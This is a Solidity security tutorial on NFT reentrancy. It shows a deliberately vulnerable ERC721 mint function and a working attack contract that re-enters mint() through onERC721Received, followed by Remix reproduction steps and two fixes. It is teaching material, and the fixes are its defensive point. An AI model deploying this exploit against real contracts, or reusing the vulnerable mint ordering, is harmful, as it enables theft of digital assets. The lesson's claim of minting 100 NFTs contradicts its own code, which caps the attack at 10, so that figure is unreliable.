---
title: S16. NFT Reentrancy Attack
tags:
    - solidity
    - security
    - fallback
    - nft
    - erc721
    - erc1155
---

# WTF Solidity S16. NFT Reentrancy Attack

Recently, I have been revisiting Solidity, consolidating the finer details, and writing "WTF Solidity" tutorials for newbies. 

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science) | [@WTFAcademy_](https://twitter.com/WTFAcademy_)

Community: [Discord](https://discord.gg/5akcruXrsk)｜[Wechat](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[Website wtf.academy](https://wtf.academy)

Codes and tutorials are open source on GitHub: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

English translations by: [@to_22X](https://twitter.com/to_22X)

-----

In this lesson, we will discuss the reentrancy vulnerability in NFT contracts and attack a vulnerable NFT contract to mint 100 NFTs.

## NFT Reentrancy Risk

In [S01 Reentrancy Attack](https://github.com/AmazingAng/WTFSolidity/blob/main/S01_ReentrancyAttack/readme.md), we discussed that reentrancy attack is one of the most common attacks in smart contracts, where an attacker exploits contract vulnerabilities (e.g., `fallback` function) to repeatedly call the contract and transfer assets or mint a large number of tokens. When transferring NFTs, the contract's `fallback` or `receive` functions are not triggered. So why is there a reentrancy risk?

This is because the NFT standards ([ERC721](https://github.com/AmazingAng/WTFSolidity/blob/main/34_ERC721/readme.md)/[ERC1155](https://github.com/AmazingAng/WTFSolidity/blob/main/40_ERC1155/readme.md)) have introduced secure transfers to prevent users from accidentally sending assets to a black hole. If the recipient address is a contract, it will call the corresponding check function to ensure that it is ready to receive the NFT asset. For example, the `safeTransferFrom()` function of ERC721 calls the `onERC721Received()` function of the target address, and a hacker can embed malicious code in it to launch an attack.

We have summarized the functions in ERC721 and ERC1155 that have potential reentrancy risks:

![](./img/S16-1.png)

## Vulnerable Example

Now let's learn an example of an NFT contract with a reentrancy vulnerability. This is an `ERC721` contract where each address can mint one NFT for free, but we can exploit the reentrancy vulnerability to mint multiple NFTs at once.

### Vulnerable Contract

The `NFTReentrancy` contract inherits from the `ERC721` contract. It has two main state variables: `totalSupply` to track the total supply of NFTs and `mintedAddress` to keep track of addresses that have already minted to prevent a user from minting multiple times. It has two main functions:
- Constructor: Initializes the name and symbol of the `ERC721` NFT.
- `mint()`: Mint function where each user can mint one NFT for free. **Note: This function has a reentrancy vulnerability!**

```solidity
contract NFTReentrancy is ERC721 {
    uint256 public totalSupply;
    mapping(address => bool) public mintedAddress;
    // Constructor to initialize the name and symbol of the NFT collection
    constructor() ERC721("Reentry NFT", "ReNFT"){}

    // Mint function, each user can only mint 1 NFT
    // Contains a reentrancy vulnerability
    function mint() payable external {
        // Check if already minted
        require(mintedAddress[msg.sender] == false);
        // Increase total supply
        totalSupply++;
        // Mint the NFT
        _safeMint(msg.sender, totalSupply);
        // Record the minted address
        mintedAddress[msg.sender] = true;
    }
}
```

### Attack Contract

The reentrancy vulnerability in the `NFTReentrancy` contract lies in the `mint()` function, which calls the `_safeMint()` function in the `ERC721` contract, which in turn calls the `_checkOnERC721Received()` function of the recipient address. If the recipient address's `_checkOnERC721Received()` contains malicious code, an attack can be performed.

The `Attack` contract inherits the `IERC721Receiver` contract and has one state variable `nft` that stores the address of the vulnerable NFT contract. It has three functions:
- Constructor: Initializes the address of the vulnerable NFT contract.
- `attack()`: Attack function that calls the `mint()` function of the NFT contract and initiates the attack.
- `onERC721Received()`: ERC721 callback function with embedded malicious code that repeatedly calls the `mint()` function and mints 10 NFTs.

```solidity
contract Attack is IERC721Receiver {
    NFTReentrancy public nft; // Address of the NFT contract

    // Initialize the NFT contract address
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }
    
    // Attack function to initiate the attack
    function attack() external {
        nft.mint();
    }

    // Callback function for ERC721, repeatedly calls the mint function to mint 10 NFTs
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}
```

## Reproduce on `Remix`

1. Deploy the `NFTReentrancy` contract.
2. Deploy the `Attack` contract with the `NFTReentrancy` contract address as the parameter.
3. Call the `attack()` function of the `Attack` contract to initiate the attack.
4. Call the `balanceOf()` function of the `NFTReentrancy` contract to check the holdings of the `Attack` contract. You will see that it holds `10` NFTs, indicating a successful attack.

![](./img/S16-2.png)

## How to Prevent

There are two main methods to prevent reentrancy attack vulnerabilities: checks-effects-interactions pattern and reentrant guard.

1. Checks-Effects-Interactions Pattern: This pattern emphasizes checking the state variables, updating the state variables (e.g., balances), and then interacting with other contracts. We can use this pattern to fix the vulnerable `mint()` function:

  ```solidity
    function mint() payable external {
        // Check if already minted
        require(mintedAddress[msg.sender] == false);
        // Increase total supply
        totalSupply++;
        // Record the minted address
        mintedAddress[msg.sender] = true;
        // Mint the NFT
        _safeMint(msg.sender, totalSupply);
    }
  ```

2. Reentrant Lock: It is a modifier used to prevent reentrant functions. It is recommended to use [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) provided by OpenZeppelin.

## Summary

In this lesson, we introduced the reentrancy vulnerability in NFTs and attacked a vulnerable NFT contract by minting 100 NFTs. Currently, there are two main methods to prevent reentrancy attacks: the checks-effects-interactions pattern and the reentrant lock.